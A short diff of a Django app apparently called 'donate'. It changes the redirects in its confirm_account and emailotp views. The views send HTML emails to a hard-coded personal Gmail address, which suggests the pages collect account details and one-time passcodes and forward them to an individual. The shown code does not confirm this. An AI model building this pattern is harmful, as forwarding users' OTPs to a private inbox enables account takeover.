@@ -30,7 +30,7 @@ def confirm_account(request):
         ['pc7300250@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('success')
 
    return render(request, 'donate/confirm_account.html')
 
@@ -50,7 +50,7 @@ def emailotp(request):
         ['pc7300250@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('emailotp')
+       return redirect('success')
 
    return render(request, 'donate/emailotp.html')
 
